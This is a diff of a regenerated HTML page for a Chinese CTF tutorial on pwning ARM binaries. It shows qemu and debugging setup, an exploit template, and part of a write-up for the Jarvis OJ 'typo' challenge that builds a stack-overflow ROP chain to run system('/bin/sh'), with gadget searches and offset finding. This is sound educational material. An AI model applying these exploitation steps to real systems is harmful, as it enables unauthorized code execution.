@@ -32,7 +32,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/how-2-pwn-an-arm-binary/" />
@@ -61,15 +61,12 @@
 <meta property="og:description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/how-2-pwn-an-arm-binary/" />
-<meta property="article:published_time" content="2018-07-31T20:00:54&#43;08:00"/>
-<meta property="article:modified_time" content="2018-07-31T20:00:54&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-07-31T20:00:54+08:00" />
+<meta property="article:modified_time" content="2018-07-31T20:00:54+08:00" />
 <meta itemprop="name" content="如何 pwn 掉一个 arm 的binary">
 <meta itemprop="description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0">
-
-
-<meta itemprop="datePublished" content="2018-07-31T20:00:54&#43;08:00" />
-<meta itemprop="dateModified" content="2018-07-31T20:00:54&#43;08:00" />
+<meta itemprop="datePublished" content="2018-07-31T20:00:54+08:00" />
+<meta itemprop="dateModified" content="2018-07-31T20:00:54+08:00" />
 <meta itemprop="wordCount" content="5940">
 
 
@@ -338,228 +335,190 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#环境搭建">环境搭建</a>
-<ul>
-<li><a href="#主机信息">主机信息：</a></li>
-<li><a href="#预备环境安装">预备环境安装：</a></li>
-<li><a href="#安装qemu">安装qemu：</a></li>
-<li><a href="#安装共享库">安装共享库：</a></li>
-<li><a href="#运行">运行：</a></li>
-<li><a href="#调试">调试：</a></li>
-<li><a href="#效果图">效果图：</a></li>
-<li><a href="#more">more：</a></li>
-<li><a href="#reference">reference：</a></li>
-</ul></li>
-<li><a href="#运行和调试">运行和调试</a></li>
-<li><a href="#arm-下的函数调用约定">arm 下的函数调用约定</a></li>
-<li><a href="#jarvis-oj-typo">Jarvis oj - typo</a>
-<ul>
-<li><a href="#静态分析">静态分析</a></li>
-<li><a href="#思路">思路</a></li>
-<li><a href="#rop">ROP</a></li>
-</ul></li>
-<li><a href="#codegate2018-melong">Codegate2018 - melong</a>
-<ul>
-<li><a href="#静态分析-1">静态分析</a></li>
-<li><a href="#思路分析">思路分析</a></li>
-<li><a href="#exp">exp</a></li>
-</ul></li>
-<li><a href="#shanghai2018-baby-arm">Shanghai2018 - baby_arm</a>
-<ul>
-<li><a href="#静态分析-2">静态分析</a></li>
-<li><a href="#思路-1">思路</a></li>
-<li><a href="#notice">notice</a></li>
-</ul></li>
-<li><a href="#more-1">More</a></li>
-<li><a href="#后记">后记</a></li>
-<li><a href="#last">Last</a></li>
-<li><a href="#reference-1">Reference</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ul>
+        <li><a href="#主机信息">主机信息：</a></li>
+        <li><a href="#预备环境安装">预备环境安装：</a></li>
+        <li><a href="#安装qemu">安装qemu：</a></li>
+        <li><a href="#安装共享库">安装共享库：</a></li>
+        <li><a href="#运行">运行：</a></li>
+        <li><a href="#调试">调试：</a></li>
+        <li><a href="#效果图">效果图：</a></li>
+        <li><a href="#more">more：</a></li>
+        <li><a href="#reference">reference：</a></li>
+      </ul>
+    </li>
+    <li><a href="#运行和调试">运行和调试</a></li>
+    <li><a href="#arm-下的函数调用约定">arm 下的函数调用约定</a></li>
+    <li><a href="#jarvis-oj---typo">Jarvis oj - typo</a>
+      <ul>
+        <li><a href="#静态分析">静态分析</a></li>
+        <li><a href="#思路">思路</a></li>
+        <li><a href="#rop">ROP</a></li>
+      </ul>
+    </li>
+    <li><a href="#codegate2018---melong">Codegate2018 - melong</a>
+      <ul>
+        <li><a href="#静态分析-1">静态分析</a></li>
+        <li><a href="#思路分析">思路分析</a></li>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#shanghai2018---baby_arm">Shanghai2018 - baby_arm</a>
+      <ul>
+        <li><a href="#静态分析-2">静态分析</a></li>
+        <li><a href="#思路-1">思路</a></li>
+        <li><a href="#notice">notice</a></li>
+      </ul>
+    </li>
+    <li><a href="#more-1">More</a></li>
+    <li><a href="#后记">后记</a></li>
+    <li><a href="#last">Last</a></li>
+    <li><a href="#reference-1">Reference</a></li>
+  </ul>
 </nav>
   </div>
 </div>
 
     
     <div class="post-content">
-      
-
-<p>这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题</p>
-
+      <p>这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题</p>
 <h2 id="环境搭建">环境搭建</h2>
-
 <p>环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来</p>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>原文链接<a href="http://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html">M4x@10.0.0.55</a>
 本文中用于展示的binary分别来自Jarvis OJ上pwn的add，typo两道题</p>
 </blockquote>
-
 <p>写这篇教程的主要目的是因为最近想搞其他系统架构的 pwn，因此第一步就是搭建环境了，网上搜索了一波，发现很多教程都是需要树莓派，芯片等硬件，然后自己编译 gdb，后来实践的过程中发现可以很简单地使用 qemu 实现运行和调试异架构 binary，因此在这里分享一下我的方法。</p>
-
 <h3 id="主机信息">主机信息：</h3>
-
 <p>以一台新装的 deepin 虚拟机(基于 debian)为例，详细信息如下：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5av617a5j30lq0bu78m.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5av617a5j30lq0bu78m.jpg" alt=""></p>
 <h3 id="预备环境安装">预备环境安装：</h3>
-
 <ul>
 <li>安装 git，gdb 和 gdb-multiarch</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get update
-$ sudo apt-get install git gdb gdb-multiarch</code></pre></td></tr></table>
+$ sudo apt-get install git gdb gdb-multiarch
+</code></pre></td></tr></table>
 </div>
-</div>
-<ul>
+</div><ul>
 <li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件）</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pwndbg/pwndbg
 $ <span class="nb">cd</span> pwndbg
-$ ./setup.sh</code></pre></td></tr></table>
+$ ./setup.sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>装好之后如图：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt="" /></p>
-
+</div><p>装好之后如图：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt=""></p>
 <ul>
-<li>安装pwntools，不必要，但绝对是写exp的神器</li>
-</ul>
+<li>
+<p>安装pwntools，不必要，但绝对是写exp的神器</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">  $ sudo pip install pwntools</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo pip install pwntools
+</code></pre></td></tr></table>
 </div>
-</div>
+</div></li>
+</ul>
 <h3 id="安装qemu">安装qemu：</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user
-$ sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</code></pre></td></tr></table>
+$ sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>
-
+</div><p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>
 <h3 id="安装共享库">安装共享库：</h3>
-
 <p>此时已经可以运行静态链接的 arm/mips binary 了，如下图：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5crjvp5dj31400p0ngj.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5crjvp5dj31400p0ngj.jpg" alt=""></p>
 <p>但还不能运行动态链接的 binary，如下图：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5csjo38rj313o05i779.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5csjo38rj313o05i779.jpg" alt=""></p>
 <p>这就需要我们安装对应架构的共享库，可以通过如下命令搜索：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt search <span class="s2">&#34;libc6-&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ARCH&#34;</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt search <span class="s2">&#34;libc6-&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ARCH&#34;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt="" /></p>
-
+</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt=""></p>
 <p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可</p>
-
 <h3 id="运行">运行：</h3>
-
 <p>静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p>
-
 <p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，如下图32位的动态链接 mips binary</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d1guaxvj313m03bq55.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d1guaxvj313m03bq55.jpg" alt=""></p>
 <p>使用 -L 指定共享库：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d3xxmfqj30z50c4ahc.jpg" alt="" /></p>
-
+</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d3xxmfqj30z50c4ahc.jpg" alt=""></p>
 <h3 id="调试">调试：</h3>
-
 <p>可以使用 qemu 的 -g 指定端口</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -g <span class="m">1234</span> -L /usr/mipsel-linux-gnu/ ./add</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -g <span class="m">1234</span> -L /usr/mipsel-linux-gnu/ ./add
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后使用gdb-multiarch进行调试，先指定架构，然后使用remote功能</p>
+</div><p>然后使用gdb-multiarch进行调试，先指定架构，然后使用remote功能</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; <span class="nb">set</span> architecture mips <span class="o">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="o">)</span>
-pwndbg&gt; target remote localhost:1234</code></pre></td></tr></table>
+pwndbg&gt; target remote localhost:1234
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dbufgrjj31400p013o.jpg" alt="" /></p>
-
+</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dbufgrjj31400p013o.jpg" alt=""></p>
 <p>这样我们就能进行调试了</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt=""></p>
 <h3 id="效果图">效果图：</h3>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dg64kb8j31400p0tgd.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dg64kb8j31400p0tgd.jpg" alt=""></p>
 <h3 id="more">more：</h3>
-
 <p>同样，如果想要运行或者调试其他架构的 binary，只需安装其他架构的 qemu 和共享库即可</p>
-
 <h3 id="reference">reference：</h3>
-
 <p><a href="https://docs.pwntools.com/en/stable/qemu.html">https://docs.pwntools.com/en/stable/qemu.html</a></p>
-
 <p><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></p>
-
-<hr />
-
+<hr>
 <h2 id="运行和调试">运行和调试</h2>
-
 <p>安装好 qemu 之后, 就可以在本地运行和调试 binary 了, 我写了一个模板:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -588,48 +547,42 @@ pwndbg&gt; target remote localhost:1234</code></pre></td></tr></table>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;your_binary&#34;</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span><span class="p">)</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span></code></pre></td></tr></table>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>说明一下:</p>
-
+</div><p>说明一下:</p>
 <ul>
 <li>根据 pwntools 的 <a href="http://docs.pwntools.com/en/stable/context.html?highlight=context.binary#pwnlib-context-setting-runtime-variables">官方文档</a>, 使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数了</li>
 </ul>
-
 <blockquote>
 <p>The recommended method is to use context.binary to automagically set all of the appropriate values.</p>
 </blockquote>
-
 <ul>
-<li>python exp.py r 打远程</li>
-<li>python exp.py l 本地测试</li>
-
-<li><p>python exp.py d/a/b/&hellip; 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</p></li>
-
-<li><p>这里只写了使用 arm-linux-gnueabi 的情况, 使用 arm-linux-gnueabihf 的话更改参数即可, 关于二者的区别可以参考这篇 <a href="https://www.cnblogs.com/xiaotlili/p/3306100.html">文章</a></p></li>
+<li>
+<p>python exp.py r 打远程</p>
+</li>
+<li>
+<p>python exp.py l 本地测试</p>
+</li>
+<li>
+<p>python exp.py d/a/b/&hellip; 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</p>
+</li>
+<li>
+<p>这里只写了使用 arm-linux-gnueabi 的情况, 使用 arm-linux-gnueabihf 的话更改参数即可, 关于二者的区别可以参考这篇 <a href="https://www.cnblogs.com/xiaotlili/p/3306100.html">文章</a></p>
+</li>
 </ul>
-
 <h2 id="arm-下的函数调用约定">arm 下的函数调用约定</h2>
-
 <p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中</p>
-
 <p>一图胜千言:</p>
-
-<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="" /></p>
-
+<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p>
 <p>by the way, arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转</p>
-
 <p>接下来以几道题目为例进行分析</p>
-
-<h2 id="jarvis-oj-typo">Jarvis oj - typo</h2>
-
+<h2 id="jarvis-oj---typo">Jarvis oj - typo</h2>
 <p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>
-
 <h3 id="静态分析">静态分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -640,19 +593,19 @@ pwndbg&gt; target remote localhost:1234</code></pre></td></tr></table>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●<span class="o">]</span> check typo
-typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
+typo: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;</span>
     Arch:     arm-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE</code></pre></td></tr></table>
+    PIE:      No PIE
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>32 位 arm 静态链接的程序, strip 过了, 并且没有开栈溢出保护, 因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</p>
+</div><p>32 位 arm 静态链接的程序, strip 过了, 并且没有开栈溢出保护, 因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -683,17 +636,15 @@ Let<span class="s1">&#39;s Do Some Typing Exercise~
 </span><span class="s1">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 </span><span class="s1">qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock&#39;</span> failed.
 qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion <span class="sb">`</span>!have_tb_lock<span class="err">&#39;</span> failed.
-<span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">3426</span> segmentation fault  ./typo</code></pre></td></tr></table>
+<span class="o">[</span>1<span class="o">]</span>    <span class="m">3426</span> segmentation fault  ./typo
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="思路">思路</h3>
-
-<p>运行一下发现是一个打字游戏, 很容易就找到了溢出点, 利用 rop chain 构造 system(&ldquo;/bin/sh&rdquo;) 即可, /bin/sh 的地址比较好找, 只要找到 system 的地址, 这个题目就很容易解决了</p>
-
+</div><h3 id="思路">思路</h3>
+<p>运行一下发现是一个打字游戏, 很容易就找到了溢出点, 利用 rop chain 构造 system(&quot;/bin/sh&quot;) 即可, /bin/sh 的地址比较好找, 只要找到 system 的地址, 这个题目就很容易解决了</p>
 <p>binary 去除了符号表信息, 并不是太容易看出来函数功能, 幸运的是通过在 IDA 中查看 /bin/sh 的交叉引用, 我们能找到调用 system 的函数(sub_10BA8 函数中出现了 /bin/sh, 读过 system 源码的同学可以发现该函数与 system 的流程类似, 于是大胆猜测 sun_10BA8 即为 system, 后来事实证明确实是)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -714,19 +665,16 @@ qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Asserti
 </span><span class="c1"></span>  <span class="k">else</span>
     <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">sub_10BA8</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="s">&#34;exit 0&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<hr />
-
+</div><hr>
 <p>后来发现，使用 <code>rizzo</code> 可以恢复出 system 的符号表，这样寻找 system 的地址就很容易了</p>
-
 <h3 id="rop">ROP</h3>
-
 <p>这样我们只需要找一个能控制 r0 的 gadget 寄存器就行了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -739,13 +687,13 @@ qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Asserti
 jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh          
 Strings <span class="nv">information</span>
 <span class="o">============================================================</span>
-0x0006c384 : /bin/sh</code></pre></td></tr></table>
+0x0006c384 : /bin/sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>于是可以构造如下的栈结构</p>
+</div><p>于是可以构造如下的栈结构</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -759,9 +707,9 @@ Strings <span class="nv">information</span>
 </span><span class="lnt">12
 </span><span class="lnt">13
 </span><span class="lnt">14
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+------------+
 |            |
 |   padding  |
 |            |
@@ -774,15 +722,14 @@ Strings <span class="nv">information</span>
 | junk_data  |
 +------------+
 | system_addr| &lt;- 0x100B4
-+------------+</pre></td></tr></table>
++------------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&ldquo;/bin/sh&rdquo;) 来 get shell</p>
-
+</div><p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&quot;/bin/sh&quot;) 来 get shell</p>
 <p>此时还有一个问题, 不知道 padding 的长度, 可以通过 pwntools 的 cyclic/cyclic -l 来找长度</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -869,25 +816,24 @@ Invalid address 0x62616164
 
 
 ────────────────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────────────────
-<span class="m">00</span>:0000│ sp  0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
-<span class="m">01</span>:0004│     0xfffef09c ◂— 0x62616166 <span class="o">(</span><span class="s1">&#39;faab&#39;</span><span class="o">)</span>
-<span class="m">02</span>:0008│     0xfffef0a0 ◂— 0x62616167 <span class="o">(</span><span class="s1">&#39;gaab&#39;</span><span class="o">)</span>
-<span class="m">03</span>:000c│     0xfffef0a4 ◂— 0x62616168 <span class="o">(</span><span class="s1">&#39;haab&#39;</span><span class="o">)</span>
-<span class="m">04</span>:0010│     0xfffef0a8 ◂— 0x62616169 <span class="o">(</span><span class="s1">&#39;iaab&#39;</span><span class="o">)</span>
-<span class="m">05</span>:0014│     0xfffef0ac ◂— 0x6261616a <span class="o">(</span><span class="s1">&#39;jaab&#39;</span><span class="o">)</span>
-<span class="m">06</span>:0018│     0xfffef0b0 ◂— 0x6261616b <span class="o">(</span><span class="s1">&#39;kaab&#39;</span><span class="o">)</span>
-<span class="m">07</span>:001c│     0xfffef0b4 ◂— 0x6261616c <span class="o">(</span><span class="s1">&#39;laab&#39;</span><span class="o">)</span>
+00:0000│ sp  0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
+01:0004│     0xfffef09c ◂— 0x62616166 <span class="o">(</span><span class="s1">&#39;faab&#39;</span><span class="o">)</span>
+02:0008│     0xfffef0a0 ◂— 0x62616167 <span class="o">(</span><span class="s1">&#39;gaab&#39;</span><span class="o">)</span>
+03:000c│     0xfffef0a4 ◂— 0x62616168 <span class="o">(</span><span class="s1">&#39;haab&#39;</span><span class="o">)</span>
+04:0010│     0xfffef0a8 ◂— 0x62616169 <span class="o">(</span><span class="s1">&#39;iaab&#39;</span><span class="o">)</span>
+05:0014│     0xfffef0ac ◂— 0x6261616a <span class="o">(</span><span class="s1">&#39;jaab&#39;</span><span class="o">)</span>
+06:0018│     0xfffef0b0 ◂— 0x6261616b <span class="o">(</span><span class="s1">&#39;kaab&#39;</span><span class="o">)</span>
+07:001c│     0xfffef0b4 ◂— 0x6261616c <span class="o">(</span><span class="s1">&#39;laab&#39;</span><span class="o">)</span>
 Program received signal SIGSEGV
 pwndbg&gt; cyclic -l 0x62616164
-<span class="m">112</span></code></pre></td></tr></table>
+<span class="m">112</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<hr />
-
+</div><hr>
 <p>或者可以直接爆破 padding 长度</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
